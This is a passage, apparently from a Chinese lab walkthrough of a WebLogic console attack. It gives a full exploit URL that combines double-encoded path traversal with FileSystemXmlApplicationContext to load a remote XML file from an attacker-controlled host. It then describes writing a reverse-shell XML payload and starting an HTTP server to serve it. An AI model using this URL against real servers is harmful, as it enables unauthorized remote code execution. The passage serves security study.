...
![示例图片](images/4进入后台.png)

发现此后台因权限问题没有部署等选项

但可通过FileSystemXmlApplicationContext()加载并执行远端xml文件：

url如下

http://127.0.0.1:7001/console/images/%252E%252E%252Fconsole.portal?_nfpb=true&_pageLabel=&handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://192.168.226.128：8000/poc.xml")

编写一个发送反向shell的xml文件

![示例图片](images/4编写xmlpoc.png)

开启http服务

![示例图片](images/4开启HTTP服务.png)
